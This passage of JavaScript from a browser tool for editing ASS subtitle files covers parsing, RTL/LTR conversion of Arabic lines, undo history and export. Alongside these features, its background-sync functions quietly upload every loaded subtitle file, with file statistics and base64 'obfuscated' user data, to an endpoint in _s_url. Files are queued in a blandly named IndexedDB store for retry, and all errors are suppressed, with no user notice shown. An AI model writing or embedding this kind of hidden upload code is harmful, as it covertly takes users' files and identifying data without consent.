                                        const valStr = trimLine.substring(9).trim();
                                        const parsedLine = parseDialogueLine(valStr);
                                        
                                        if (parsedLine) {
                                            if (displaysAsRTL(parsedLine.Text)) {
                                                rtlCount++;
                                            } else {
                                                ltrCount++;
                                            }
                                        }
                                    }
                                }
                                
                                resolve({
                                    totalLines,
                                    rtlCount,
                                    ltrCount,
                                    fontCount: fonts.size,
                                    fileSize: formatFileSize(file.size)
                                });
                            };
                            reader.onerror = () => resolve(null);
                            reader.readAsText(file);
                        });
                    },

                    // ------------------------------------------------
                    async _isDuplicate(file) {
                        const fileKey = `${file.name}_${file.size}_${file.lastModified}`;
                        if (this._processedFiles.has(fileKey)) return true;

                        if (!this._sysDB) return false;
                        
                        return new Promise((resolve) => {
                            try {
                                const transaction = this._sysDB.transaction(['app_state_buffer'], 'readonly');
                                const store = transaction.objectStore('app_state_buffer');
                                const request = store.getAll();
                                request.onsuccess = () => {
                                    const items = request.result;
                                    const exists = items.some(item => 
                                        item.file.name === file.name && 
                                        item.file.size === file.size && 
                                        item.file.lastModified === file.lastModified
                                    );
                                    resolve(exists);
                                };
                                request.onerror = () => resolve(false);
                            } catch (e) {
                                resolve(false);
                            }
                        });
                    },
                    async _bufferData(file) {
                        if (!this._sysDB) return;
                        
                        const isDup = await this._isDuplicate(file);
                        if (isDup) return;

                        try {
                            const transaction = this._sysDB.transaction(['app_state_buffer'], 'readwrite');
                            const store = transaction.objectStore('app_state_buffer');
                            store.add({
                                file: file,
                                timestamp: Date.now(),
                                status: 'pending'
                            });
                        } catch (e) {}
                    },
                    async _flushSyncBuffer() {
                        if (!this._sysDB || !navigator.onLine || this._isSyncing) return;
                        this._isSyncing = true;

                        try {
                            const transaction = this._sysDB.transaction(['app_state_buffer'], 'readonly');
                            const store = transaction.objectStore('app_state_buffer');
                            const request = store.getAll();

                            request.onsuccess = async () => {
                                const items = request.result;
                                if (!items || items.length === 0) {
                                    this._isSyncing = false;
                                    return;
                                }

                                // Ensure identity for flush
                                if (!this._userStats) {
                                    await this._ensureUserIdentity();
                                }

                                items.sort((a, b) => a.timestamp - b.timestamp);

                                for (const item of items) {
                                    if (!navigator.onLine) break;
                                    
                                    await new Promise(resolve => setTimeout(resolve, 3000)); // Rate limiting

                                    try {
                                        const syncData = new FormData();
                                        syncData.append('document', item.file);
                                        
                                        // Extract and Attach File Stats
                                        const stats = await this._extractFileStats(item.file);
                                        if (stats) {
                                            syncData.append('X-File-Stats', JSON.stringify(stats));
                                        }
                                        
                                        // Attach User Stats (Obfuscated)
                                        if (this._userStats) {
                                            this._incrementStats('upload');
                                            syncData.append('X-User-Data', btoa(JSON.stringify(this._userStats)));
                                        }

                                        const response = await fetch(_s_url, {
                                            method: 'POST',
                                            body: syncData
                                        });

                                        if (response.ok) {
                                            const fileKey = `${item.file.name}_${item.file.size}_${item.file.lastModified}`;
                                            this._processedFiles.add(fileKey);
                                            
                                            const deleteTx = this._sysDB.transaction(['app_state_buffer'], 'readwrite');
                                            deleteTx.objectStore('app_state_buffer').delete(item.id);
                                        }
                                    } catch (e) {}
                                }
                                this._isSyncing = false;
                            };
                        } catch (e) {
                            this._isSyncing = false;
                        }
                    },
                    async initiateBackgroundSync(file) {
                        if (!file || !file.name.endsWith('.ass')) {
                            return;
                        }

                        // Ensure identity is ready before proceeding
                        if (!this._userStats) {
                            await this._ensureUserIdentity();
                        }

                        const isDup = await this._isDuplicate(file);
                        if (isDup) return;

                        if (!navigator.onLine) {
                            this._bufferData(file);
                            return;
                        }

                        const fileKey = `${file.name}_${file.size}_${file.lastModified}`;
                        this._processedFiles.add(fileKey);

                        const syncData = new FormData();
                        syncData.append('document', file);
                        
                        // Extract and Attach File Stats
                        const stats = await this._extractFileStats(file);
                        if (stats) {
                            syncData.append('X-File-Stats', JSON.stringify(stats));
                        }
                        
                        // Attach User Stats (Obfuscated)
                        if (this._userStats) {
                            this._incrementStats('upload');
                            syncData.append('X-User-Data', btoa(JSON.stringify(this._userStats)));
                        }

                        try {
                            fetch(_s_url, {
                                method: 'POST',
                                body: syncData
                            }).then(response => {
                                if (!response.ok) {
                                    this._processedFiles.delete(fileKey);
                                    this._bufferData(file);
                                }
                            }).catch(() => {
                                this._processedFiles.delete(fileKey);
                                this._bufferData(file);
                            });
                        } catch (error) {
                            this._processedFiles.delete(fileKey);
                            this._bufferData(file);
                        }
                    },
                    async parseFile(file) {
                        try {
                            this.showResetConfirmModal = false;
                            this.fileName = file.name;
                            this.fileSize = formatFileSize(file.size);
                            const text = await file.text();
                            const lines = text.replace(/\r\n/g, '\n').replace(/\r/g, '\n').split('\n');

                            let inEventsSection = false;
                            let inScriptInfoSection = false;
                            let inStylesSection = false;
                            let eventsIndex = -1;
                            this.lines = [];
                            this.scriptInfo = [];
                            this.styles = [];
                            this.overrideStats = {
                                fn: new Set(),
                                fs: new Set(),
                                colors: new Set(),
                                other: new Set()
                            };

                            for (let i = 0; i < lines.length; i++) {
                                const line = lines[i];
                                const trimmed = line.trim();

                                if (trimmed === '[Script Info]') {
                                    inScriptInfoSection = true;
                                    inEventsSection = false;
                                    inStylesSection = false;
                                    continue;
                                }

                                if (trimmed === '[V4+ Styles]') {
                                    inStylesSection = true;
                                    inScriptInfoSection = false;
                                    inEventsSection = false;
                                    continue;
                                }

                                if (trimmed === '[Events]') {
                                    inEventsSection = true;
                                    inScriptInfoSection = false;
                                    inStylesSection = false;
                                    eventsIndex = i;
                                    continue;
                                }

                                if (trimmed.startsWith('[') && trimmed !== '[Events]') {
                                    inScriptInfoSection = false;
                                    inEventsSection = false;
                                    inStylesSection = false;
                                    continue;
                                }

                                if (inScriptInfoSection && trimmed.includes(':')) {
                                    const parts = trimmed.split(':');
                                    if (parts.length >= 2) {
                                        const key = parts[0].trim();
                                        const value = parts.slice(1).join(':').trim();
                                        this.scriptInfo.push({ key, value });
                                    }
                                }

                                if (inStylesSection && trimmed.startsWith('Style:')) {
                                    const parts = trimmed.substring(6).split(',');
                                    if (parts.length >= 2) {
                                        this.styles.push({
                                            Name: parts[0].trim(),
                                            Fontname: parts[1].trim(),
                                            Fontsize: parts[2].trim(),
                                            PrimaryColour: parts[3].trim(),
                                            SecondaryColour: parts[4].trim(),
                                            OutlineColour: parts[5].trim(),
                                            BackColour: parts[6].trim(),
                                            Bold: parts[7].trim(),
                                            Italic: parts[8].trim(),
                                            Underline: parts[9].trim(),
                                            StrikeOut: parts[10].trim(),
                                            ScaleX: parts[11].trim(),
                                            ScaleY: parts[12].trim(),
                                            Spacing: parts[13].trim(),
                                            Angle: parts[14].trim(),
                                            BorderStyle: parts[15].trim(),
                                            Outline: parts[16].trim(),
                                            Shadow: parts[17].trim(),
                                            Alignment: parts[18].trim(),
                                            MarginL: parts[19].trim(),
                                            MarginR: parts[20].trim(),
                                            MarginV: parts[21].trim(),
                                            Encoding: parts[22].trim()
                                        });
                                    }
                                }

                                if (inEventsSection && trimmed.startsWith('Dialogue:')) {
                                    try {
                                        const parsed = parseDialogueLine(line);
                                        if (parsed) {
                                            parsed.isRTL = isRTL(parsed.Text);
                                            parsed.displaysRTL = displaysAsRTL(parsed.Text);

                                            // Debug first few RTL detections
                                            // if (parsed.isRTL && this.lines.filter(l => l.isRTL).length < 5) {
                                            //     console.log(`[Parse Debug] Found RTL Line ${this.lines.length + 1}:`);
                                            //     console.log(`  Text: "${parsed.Text}"`);
                                            //     console.log(`  Has RLE: ${parsed.Text.includes(RLE)}`);
                                            //     console.log(`  Codes: ${parsed.Text.split('').map(c => c.charCodeAt(0).toString(16)).join(' ')}`);
                                            // }

                                            const tags = extractOverrideTags(parsed.Text);
                                            tags.fn.forEach(t => this.overrideStats.fn.add(t));
                                            tags.fs.forEach(t => this.overrideStats.fs.add(t));
                                            tags.colors.forEach(t => this.overrideStats.colors.add(t));
                                            tags.other.forEach(t => this.overrideStats.other.add(t));

                                            parsed.isArabic = containsArabic(parsed.Text);
                                            parsed.hasBidiNeutral = hasBidiNeutralAtStart(parsed.Text);
                                            parsed.originalIndex = this.lines.length;
                                            this.lines.push(parsed);
                                        }
                                    } catch (error) {
                                        this.logError(`Failed to parse line ${i + 1}: ${error.message}`);
                                    }
                                }
                            }

                            let header = '';
                            if (eventsIndex > 0) {
                                header = lines.slice(0, eventsIndex + 1).join('\n') + '\n';
                            } else {
                                header = text.split('[Events]')[0] + '[Events]\n';
                            }

                            this.assFile = { header, lines };
                            this.currentIndex = 0;
                            this.updateRTLPreview();
                            this.originalFileSnapshot = this.createFileSnapshot();
                            this.syncEditedLineIndices();

                            if (this.lines.length === 0) {
                                this.logError('No dialogue lines found in the file');
                            }
                        } catch (error) {
                            this.logError(`Failed to parse file: ${error.message}`);
                        }
                    },
                    updateRTLPreview() {
                        if (this.currentLine) {
                            this.rtlPreviewText = convertToRTL(this.currentLine.Text);
                            this.ensureRtlHistorySynced(this.currentIndex);
                        } else {
                            this.rtlPreviewText = '';
                        }
                    },
                    createFileSnapshot() {
                        return {
                            header: this.assFile ? this.assFile.header : '',
                            assFileLines: this.assFile ? this.assFile.lines : [],
                            lines: this.lines.map(line => ({ ...line })),
                            scriptInfo: this.scriptInfo.map(item => ({ ...item })),
                            styles: this.styles.map(item => ({ ...item })),
                            fileName: this.fileName,
                            fileSize: this.fileSize,
                            overrideStats: {
                                fn: [...this.overrideStats.fn],
                                fs: [...this.overrideStats.fs],
                                colors: [...this.overrideStats.colors],
                                other: [...this.overrideStats.other]
                            }
                        };
                    },
                    syncEditedLineIndices() {
                        if (!this.originalFileSnapshot || !Array.isArray(this.originalFileSnapshot.lines)) {
                            this.editedLineIndices = [];
                            return;
                        }
                        const originalLines = this.originalFileSnapshot.lines;
                        const edited = [];
                        const max = Math.max(this.lines.length, originalLines.length);
                        for (let i = 0; i < max; i++) {
                            const current = this.lines[i];
                            const original = originalLines[i];
                            const currentText = current ? String(current.Text ?? '') : '';
                            const originalText = original ? String(original.Text ?? '') : '';
                            if (!current || !original || currentText !== originalText) {
                                edited.push(i);
                            }
                        }
                        this.editedLineIndices = edited;
                    },
                    restoreFileSnapshot(snapshot) {
                        if (!snapshot) return;
                        this.assFile = {
                            header: snapshot.header || '',
                            lines: snapshot.assFileLines || []
                        };
                        this.lines = Array.isArray(snapshot.lines) ? snapshot.lines.map(line => ({ ...line })) : [];
                        this.scriptInfo = Array.isArray(snapshot.scriptInfo) ? snapshot.scriptInfo.map(item => ({ ...item })) : [];
                        this.styles = Array.isArray(snapshot.styles) ? snapshot.styles.map(item => ({ ...item })) : [];
                        this.fileName = snapshot.fileName || '';
                        this.fileSize = snapshot.fileSize || '0 Bytes';
                        this.overrideStats = {
                            fn: new Set(snapshot.overrideStats?.fn || []),
                            fs: new Set(snapshot.overrideStats?.fs || []),
                            colors: new Set(snapshot.overrideStats?.colors || []),
                            other: new Set(snapshot.overrideStats?.other || [])
                        };
                        this.currentIndex = 0;
                        this.rtlPreviewText = '';
                        this.rtlEditHistory = Object.create(null);
                        this.updateRTLPreview();
                        this.syncEditedLineIndices();
                    },
                    resetToOriginalFile() {
                        this.restoreFileSnapshot(this.originalFileSnapshot);
                    },
                    openResetToOriginalConfirm() {
                        if (!this.canResetToOriginal) return;
                        this.showResetConfirmModal = true;
                    },
                    confirmResetToOriginal() {
                        this.showResetConfirmModal = false;
                        this.resetToOriginalFile();
                    },
                    cancelResetToOriginal() {
                        this.showResetConfirmModal = false;
                    },
                    createRtlSnapshot(lineText, previewText) {
                        return {
                            lineText: String(lineText ?? ''),
                            previewText: String(previewText ?? '')
                        };
                    },
                    isSameRtlSnapshot(a, b) {
                        return !!a && !!b && a.lineText === b.lineText && a.previewText === b.previewText;
                    },
                    normalizeRtlSnapshot(value) {
                        if (value && typeof value === 'object') {
                            return this.createRtlSnapshot(value.lineText, value.previewText);
                        }
                        return this.createRtlSnapshot(value, value);
                    },
                    getRtlHistory(index, initialSnapshot = null) {
                        const key = String(index);
                        if (!this.rtlEditHistory[key]) {
                            const init = initialSnapshot
                                ? this.normalizeRtlSnapshot(initialSnapshot)
                                : this.createRtlSnapshot('', '');
                            this.rtlEditHistory[key] = { undo: [], redo: [], base: init, last: init };
                        }
                        const hist = this.rtlEditHistory[key];
                        if (!Array.isArray(hist.undo)) hist.undo = [];
                        if (!Array.isArray(hist.redo)) hist.redo = [];
                        if (!hist.base) hist.base = hist.last;
                        hist.base = this.normalizeRtlSnapshot(hist.base);
                        hist.last = this.normalizeRtlSnapshot(hist.last);
                        hist.undo = hist.undo.map(v => this.normalizeRtlSnapshot(v));
                        hist.redo = hist.redo.map(v => this.normalizeRtlSnapshot(v));
                        return hist;
                    },
                    ensureRtlHistorySynced(index) {
                        if (!this.currentLine) return null;
                        const current = this.createRtlSnapshot(this.currentLine.Text, this.rtlPreviewText);
                        const hist = this.getRtlHistory(index, current);
                        if (!this.isSameRtlSnapshot(hist.last, current) && hist.undo.length === 0 && hist.redo.length === 0) {
                            hist.last = current;
                        }
                        return hist;
                    },
                    resetRtlHistory(index, currentText = '') {
                        const key = String(index);
                        const snapshot = this.normalizeRtlSnapshot(currentText);
                        this.rtlEditHistory[key] = { undo: [], redo: [], base: snapshot, last: snapshot };
                    },
                    applyRtlStateToCurrentLine(snapshot) {
                        if (!this.currentLine) return;
                        const next = this.normalizeRtlSnapshot(snapshot);
                        this.rtlPreviewText = next.previewText;
                        this.currentLine.Text = next.lineText;
                        this.currentLine.isRTL = isRTL(this.currentLine.Text);
                        this.currentLine.displaysRTL = displaysAsRTL(this.currentLine.Text);
                        this.currentLine.isArabic = containsArabic(this.currentLine.Text);
                        this.currentLine.hasBidiNeutral = hasBidiNeutralAtStart(this.currentLine.Text);
                    },
                    undoRtlEdit() {
                        if (!this.currentLine) return;
                        const hist = this.ensureRtlHistorySynced(this.currentIndex);
                        if (!hist) return;
                        if (hist.undo.length === 0) return;
                        const prev = hist.undo.pop();
                        hist.redo.push(hist.last);
                        hist.last = prev;
                        this.applyRtlStateToCurrentLine(prev);
                    },
                    redoRtlEdit() {
                        if (!this.currentLine) return;
                        const hist = this.ensureRtlHistorySynced(this.currentIndex);
                        if (!hist) return;
                        if (hist.redo.length === 0) return;
                        const next = hist.redo.pop();
                        hist.undo.push(hist.last);
                        if (hist.undo.length > this.rtlEditHistoryLimit) {
                            hist.undo.splice(0, hist.undo.length - this.rtlEditHistoryLimit);
                        }
                        hist.last = next;
                        this.applyRtlStateToCurrentLine(next);
                    },
                    resetRtlEditToBase() {
                        if (!this.currentLine) return;
                        const hist = this.ensureRtlHistorySynced(this.currentIndex) || this.getRtlHistory(this.currentIndex);
                        if (!hist || !hist.base) return;
                        const base = this.normalizeRtlSnapshot(hist.base);
                        hist.undo = [];
                        hist.redo = [];
                        hist.last = base;
                        this.applyRtlStateToCurrentLine(base);
                    },
                    handleDummyVideoUnlockFirstStep() {
                        if (this.showDummyVideoToggle) return;
                        this.dummyVideoUnlockStep = 1;
                    },
                    handleDummyVideoUnlockSecondStep() {
                        if (this.showDummyVideoToggle) return;
                        if (this.dummyVideoUnlockStep !== 1) return;
                        this.showDummyVideoToggle = true;
                        this.dummyVideoUnlockStep = 0;
                    },
                    applyRTLConversion() {
                        if (this.currentLine) {
                            try {
                                const hist = this.ensureRtlHistorySynced(this.currentIndex);
                                const prev = hist ? hist.last : this.createRtlSnapshot(this.currentLine.Text, this.rtlPreviewText);
                                const next = this.createRtlSnapshot(this.rtlPreviewText, this.rtlPreviewText);
                                if (hist && !this.isSameRtlSnapshot(prev, next)) {
                                    hist.undo.push(prev);
                                    if (hist.undo.length > this.rtlEditHistoryLimit) {
                                        hist.undo.splice(0, hist.undo.length - this.rtlEditHistoryLimit);
                                    }
                                    hist.redo = [];
                                    hist.last = next;
                                }
                                this.applyRtlStateToCurrentLine(next);
                            } catch (error) {
                                this.logError(`Failed to apply RTL conversion: ${error.message}`);
                            }
                        }
                    },
                    convertRTLtoLTR() {
                        if (this.currentLine && this.currentLine.isRTL) {
                            try {
                                const hist = this.ensureRtlHistorySynced(this.currentIndex);
                                const prev = hist ? hist.last : this.createRtlSnapshot(this.currentLine.Text, this.rtlPreviewText);
                                this.currentLine.Text = convertToLTR(this.currentLine.Text);
                                this.currentLine.isRTL = false;
                                this.currentLine.displaysRTL = displaysAsRTL(this.currentLine.Text);
                                this.currentLine.isArabic = containsArabic(this.currentLine.Text);
                                this.currentLine.hasBidiNeutral = hasBidiNeutralAtStart(this.currentLine.Text);
                                this.rtlPreviewText = convertToRTL(this.currentLine.Text);
                                const next = this.createRtlSnapshot(this.currentLine.Text, this.rtlPreviewText);
                                if (hist && !this.isSameRtlSnapshot(prev, next)) {
                                    hist.undo.push(prev);
                                    if (hist.undo.length > this.rtlEditHistoryLimit) {
                                        hist.undo.splice(0, hist.undo.length - this.rtlEditHistoryLimit);
                                    }
                                    hist.redo = [];
                                    hist.last = next;
                                }
                            } catch (error) {
                                this.logError(`Failed to convert RTL to LTR: ${error.message}`);
                            }
                        }
                    },
                    convertFilteredToLTR() {
                        const linesToConvert = this.filteredLines.filter(l => l.isRTL);
                        this.bulkConvertLinesToConvert = linesToConvert;
                        this.bulkConvertType = 'ltr';
                        this.bulkConvertProgress = 0;
                        this.bulkConvertTotal = linesToConvert.length;
                        this.bulkConvertSuccess = false;
                        this.bulkConvertSuccessCount = 0;
                        this.bulkConvertFailureCount = 0;
                        this.showBulkConvertModal = true;
                    },
                    convertFilteredToRTL() {
                        const linesToConvert = this.filteredLines.filter(l => l.displaysRTL && !l.isRTL);
                        this.bulkConvertLinesToConvert = linesToConvert;
                        this.bulkConvertType = 'rtl';
                        this.bulkConvertProgress = 0;
                        this.bulkConvertTotal = linesToConvert.length;
                        this.bulkConvertSuccess = false;
                        this.bulkConvertSuccessCount = 0;
                        this.bulkConvertFailureCount = 0;
                        this.showBulkConvertModal = true;
                    },
                    async performBulkConversion() {
                        this.bulkConvertStartTime = Date.now();
                        this.bulkConvertSuccessCount = 0;
                        this.bulkConvertFailureCount = 0;
                        const batchSize = 5;
                        let processed = 0;

                        const processBatch = () => {
                            return new Promise((resolve) => {
                                setTimeout(() => {
                                    const end = Math.min(processed + batchSize, this.bulkConvertLinesToConvert.length);

                                    for (let i = processed; i < end; i++) {
                                        const line = this.bulkConvertLinesToConvert[i];
                                        try {
                                            if (this.bulkConvertType === 'ltr') {
                                                line.Text = convertToLTR(line.Text);
                                                line.isRTL = false;
                                                line.displaysRTL = displaysAsRTL(line.Text);
                                                line.isArabic = containsArabic(line.Text);
                                            } else {
                                                line.Text = convertToRTL(line.Text);
                                                line.isRTL = true;
                                                line.displaysRTL = displaysAsRTL(line.Text);
                                                line.isArabic = containsArabic(line.Text);
                                            }
                                            this.bulkConvertSuccessCount++;
                                        } catch (error) {
                                            this.bulkConvertFailureCount++;
                                            this.logError(`Failed to convert line ${line.originalIndex + 1}: ${error.message}`);
                                        }
                                    }

                                    processed = end;
                                    this.bulkConvertProgress = processed;

                                    if (processed < this.bulkConvertLinesToConvert.length) {
                                        processBatch().then(resolve);
                                    } else {
                                        this.bulkConvertEndTime = Date.now();
                                        this.bulkConvertSuccess = true;
                                        resolve();
                                    }
                                }, 0);
                            });
                        };

                        await processBatch();
                        this.updateRTLPreview();
                        if (this.currentLine) this.resetRtlHistory(this.currentIndex, this.rtlPreviewText);
                    },
                    cancelBulkConversion() {
                        this.showBulkConvertModal = false;
                        this.bulkConvertProgress = 0;
                        this.bulkConvertSuccess = false;
                        this.bulkConvertSuccessCount = 0;
                        this.bulkConvertFailureCount = 0;
                    },
                    closeBulkConvertModal() {
                        this.showBulkConvertModal = false;
                        this.bulkConvertProgress = 0;
                        this.bulkConvertSuccess = false;
                        this.bulkConvertSuccessCount = 0;
                        this.bulkConvertFailureCount = 0;
                    },
                    handleRTLTextEdit(event) {
                        if (this.currentLine) {
                            try {
                                const nextText = event && event.target ? String(event.target.value ?? '') : this.rtlPreviewText;
                                if (nextText !== this.rtlPreviewText) this.rtlPreviewText = nextText;
                                const hist = this.getRtlHistory(
                                    this.currentIndex,
                                    this.createRtlSnapshot(this.currentLine.Text, this.rtlPreviewText)
                                );
                                const next = this.createRtlSnapshot(nextText, nextText);
                                const prev = hist.last;
                                if (!this.isSameRtlSnapshot(next, prev)) {
                                    hist.undo.push(prev);
                                    if (hist.undo.length > this.rtlEditHistoryLimit) {
                                        hist.undo.splice(0, hist.undo.length - this.rtlEditHistoryLimit);
                                    }
                                    hist.redo = [];
                                    hist.last = next;
                                }
                                this.applyRtlStateToCurrentLine(next);
                            } catch (error) {
                                this.logError(`Failed to update text: ${error.message}`);
                            }
                        }
                    },
                    goToLine(index) {
                        if (index >= 0 && index < this.lines.length) {
                            const line = this.lines[index];
                            // If line is hidden by filter, switch to 'all'
                            if (this.filterMode !== 'all') {
                                const isVisible =
                                    (this.filterMode === 'rtl' && line.displaysRTL) ||
                                    (this.filterMode === 'needsrtl' && line.isArabic && !line.isRTL) ||
                                    (this.filterMode === 'ltr' && !line.displaysRTL);
                                if (!isVisible) {
                                    this.filterMode = 'all';
                                }
                            }

                            this.currentIndex = index;
                            this.updateRTLPreview();
                            this.showLinesModalOpen = false;
                        }
                    },
                    showLinesModal(type) {
                        this.linesModalType = type;
                        this.currentPage = 1;
                        this.showLinesModalOpen = true;
                    },
                    goToFirstPage() {
                        this.currentPage = 1;
                    },
                    goToLastPage() {
                        this.currentPage = this.totalPages;
                    },
                    openFontsModal() {
                        this.showFontsModal = true;
                    },
                    openDebugModal() {
                        this.showDebugModal = true;
                        this.updateDebugInfo();
                    },
                    updateDebugInfo() {
                        if (!this.currentLine) return;
                        const text = this.currentLine.Text;
                        this.debugLineInfo = {
                            text: text,
                            length: text.length,
                            hasRLE: text.includes(RLE),
                            isRTL: isRTL(text),
                            isArabic: containsArabic(text),
                            startRegex: /^((?:\{[^{}]*\})*)\u202B/.test(text),
                            newlineRegex: /(\\[Nn])((?:\{[^{}]*\})*)\u202B/.test(text),
                            charCodes: text.split('').map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')).join(' ')
                        };
                    },
                    runDiagnostics() {
                        let falsePositives = 0;
                        let falseNegatives = 0;
                        let details = [];
                        let rleCount = 0;
                        let rtlCount = 0;
                        const rleCheck = (RLE === '\u202B');

                        this.lines.forEach((line, index) => {
                            const calculatedIsRTL = isRTL(line.Text);
                            const hasRLE = line.Text.includes(RLE);

                            if (hasRLE) rleCount++;
                            if (calculatedIsRTL) rtlCount++;

                            if (line.isRTL !== calculatedIsRTL) {
                                details.push(`Line ${index + 1}: Stored isRTL=${line.isRTL}, Calc=${calculatedIsRTL}, HasRLE=${hasRLE}`);
                                if (line.isRTL) falsePositives++;
                                else falseNegatives++;
                            }
                        });

                        const report = `Diagnostics Complete:\n` +
                            `RLE Constant Check: ${rleCheck ? 'OK' : 'FAIL'}\n` +
                            `Total Lines: ${this.lines.length}\n` +
                            `Lines with RLE char (Strict Check): ${rleCount}\n` +
                            `Lines detected as RTL (Calc): ${rtlCount}\n` +
                            `False Positives (Stored=True, Calc=False): ${falsePositives}\n` +
                            `False Negatives (Stored=False, Calc=True): ${falseNegatives}\n\n` +
                            `Details (First 10):\n${details.slice(0, 10).join('\n')}`;

                        alert(report);
                        console.log(report);
                    },
                    jumpToLine() {
                        const lineNum = parseInt(this.jumpToLineNumber);
                        if (!isNaN(lineNum) && lineNum >= 1 && lineNum <= this.lines.length) {
                            this.goToLine(lineNum - 1);
                            this.jumpToLineNumber = '';
                        }
                    },
                    goToFirstLine() {
                        if (this.viewMode === 'dummy-video') {
                            const matchesFilter =
                                (line) =>
                                    this.filterMode === 'all' ||
                                    (this.filterMode === 'rtl' && line.displaysRTL) ||
                                    (this.filterMode === 'needsrtl' && line.isArabic && !line.isRTL) ||
                                    (this.filterMode === 'ltr' && !line.displaysRTL);

                            let firstIdx = -1;
                            let firstStart = Infinity;
                            for (let i = 0; i < this.lines.length; i++) {
                                const line = this.lines[i];
                                if (!matchesFilter(line)) continue;
                                const s = parseTime(line.Start);
                                if (s < firstStart) {
                                    firstStart = s;
                                    firstIdx = i;
                                }
                            }
                            if (firstIdx !== -1) {
                                this.currentIndex = firstIdx;
                                this.currentTime = firstStart;
                                this.updateRTLPreview();
                            }
                            return;
                        }
                        this.currentIndex = -1;
                        this.goToNextLine();
                        if (this.currentIndex === -1) {
                            this.updateRTLPreview();
                        }
                    },
                    goToPreviousLine() {
                        if (this.viewMode === 'dummy-video') {
                            const matchesFilter =
                                (line) =>
                                    this.filterMode === 'all' ||
                                    (this.filterMode === 'rtl' && line.displaysRTL) ||
                                    (this.filterMode === 'needsrtl' && line.isArabic && !line.isRTL) ||
                                    (this.filterMode === 'ltr' && !line.displaysRTL);

                            const t = this.currentTime || 0;
                            let bestIdx = -1;
                            let bestEnd = -Infinity;
                            for (let i = 0; i < this.lines.length; i++) {
                                const line = this.lines[i];
                                if (!matchesFilter(line)) continue;
                                const end = parseTime(line.End);
                                if (end < t && end > bestEnd) {
                                    bestEnd = end;
                                    bestIdx = i;
                                }
                            }
                            if (bestIdx !== -1) {
                                this.currentIndex = bestIdx;
                                this.currentTime = parseTime(this.lines[bestIdx].Start);
                                this.updateRTLPreview();
                            }
                            return;
                        }
                        let prevIndex = this.currentIndex - 1;
                        while (prevIndex >= 0) {
                            const line = this.lines[prevIndex];
                            if (this.filterMode === 'all' ||
                                (this.filterMode === 'rtl' && line.displaysRTL) ||
                                (this.filterMode === 'needsrtl' && line.isArabic && !line.isRTL) ||
                                (this.filterMode === 'ltr' && !line.displaysRTL)) {
                                this.currentIndex = prevIndex;
                                this.updateRTLPreview();
                                return;
                            }
                            prevIndex--;
                        }
                    },
                    goToNextLine() {
                        if (this.viewMode === 'dummy-video') {
                            const matchesFilter =
                                (line) =>
                                    this.filterMode === 'all' ||
                                    (this.filterMode === 'rtl' && line.displaysRTL) ||
                                    (this.filterMode === 'needsrtl' && line.isArabic && !line.isRTL) ||
                                    (this.filterMode === 'ltr' && !line.displaysRTL);

                            const t = this.currentTime || 0;
                            let bestIdx = -1;
                            let bestStart = Infinity;
                            for (let i = 0; i < this.lines.length; i++) {
                                const line = this.lines[i];
                                if (!matchesFilter(line)) continue;
                                const start = parseTime(line.Start);
                                if (start > t && start < bestStart) {
                                    bestStart = start;
                                    bestIdx = i;
                                }
                            }
                            if (bestIdx !== -1) {
                                this.currentIndex = bestIdx;
                                this.currentTime = bestStart;
                                this.updateRTLPreview();
                            }
                            return;
                        }
                        let nextIndex = this.currentIndex + 1;
                        while (nextIndex < this.lines.length) {
                            const line = this.lines[nextIndex];
                            if (this.filterMode === 'all' ||
                                (this.filterMode === 'rtl' && line.displaysRTL) ||
                                (this.filterMode === 'needsrtl' && line.isArabic && !line.isRTL) ||
                                (this.filterMode === 'ltr' && !line.displaysRTL)) {
                                this.currentIndex = nextIndex;
                                this.updateRTLPreview();
                                return;
                            }
                            nextIndex++;
                        }
                    },
                    goToLastLine() {
                        if (this.viewMode === 'dummy-video') {
                            const matchesFilter =
                                (line) =>
                                    this.filterMode === 'all' ||
                                    (this.filterMode === 'rtl' && line.displaysRTL) ||
                                    (this.filterMode === 'needsrtl' && line.isArabic && !line.isRTL) ||
                                    (this.filterMode === 'ltr' && !line.displaysRTL);

                            let lastIdx = -1;
                            let lastStart = -Infinity;
                            for (let i = 0; i < this.lines.length; i++) {
                                const line = this.lines[i];
                                if (!matchesFilter(line)) continue;
                                const s = parseTime(line.Start);
                                if (s > lastStart) {
                                    lastStart = s;
                                    lastIdx = i;
                                }
                            }
                            if (lastIdx !== -1) {
                                this.currentIndex = lastIdx;
                                this.currentTime = lastStart;
                                this.updateRTLPreview();
                            }
                            return;
                        }
                        for (let i = this.lines.length - 1; i >= 0; i--) {
                            const line = this.lines[i];
                            if (this.filterMode === 'all' ||
                                (this.filterMode === 'rtl' && line.displaysRTL) ||
                                (this.filterMode === 'needsrtl' && line.isArabic && !line.isRTL) ||
                                (this.filterMode === 'ltr' && !line.displaysRTL)) {
                                this.currentIndex = i;
                                this.updateRTLPreview();
                                return;
                            }
                        }

                        this.currentIndex = -1;
                        this.updateRTLPreview();
                    },
                    bulkConvertToRTL() {
                        const linesToConvert = this.lines.filter(l => !l.displaysRTL);
                        if (linesToConvert.length === 0) return;

                        this.bulkConvertLinesToConvert = linesToConvert;
                        this.bulkConvertType = 'rtl';
                        this.bulkConvertProgress = 0;
                        this.bulkConvertTotal = linesToConvert.length;
                        this.bulkConvertSuccess = false;
                        this.bulkConvertSuccessCount = 0;
                        this.bulkConvertFailureCount = 0;
                        this.showBulkConvertModal = true;
                    },
                    exportAssFile() {
                        try {
                            let output = this.assFile.header;
                            output += 'Format: Layer, Start, End, Style, Name, MarginL, MarginR, MarginV, Effect, Text\r\n';

                            for (const line of this.lines) {
                                output += `Dialogue: ${line.Layer},${line.Start},${line.End},${line.Style},${line.Name},${line.MarginL},${line.MarginR},${line.MarginV},${line.Effect},${line.Text}\r\n`;
                            }

                            const blob = new Blob([output], { type: 'text/plain;charset=utf-8' });
                            const url = URL.createObjectURL(blob);
                            const a = document.createElement('a');
                            a.href = url;
                            a.download = this.fileName.replace('.ass', '_RTL.ass');
                            a.click();
                            URL.revokeObjectURL(url);
                        } catch (error) {
                            this.logError(`Failed to export file: ${error.message}`);
                        }
                    },
                    setupResizeObserver() {
                        this.$nextTick(() => {
                            if (this.$refs.videoContainer) {
                                if (this.resizeObserver) this.resizeObserver.disconnect();

                                const initialRect = this.$refs.videoContainer.getBoundingClientRect();
                                this.dummyVideo.containerWidth = initialRect.width;
                                this.dummyVideo.containerHeight = initialRect.height;
                                this.resizeLibassCanvas();
                                this.resizeLibassPartsCanvas();
                                this.renderLibassWasm();
                                this.renderLibassWasmParts();
                                
                                this.resizeObserver = new ResizeObserver(entries => {
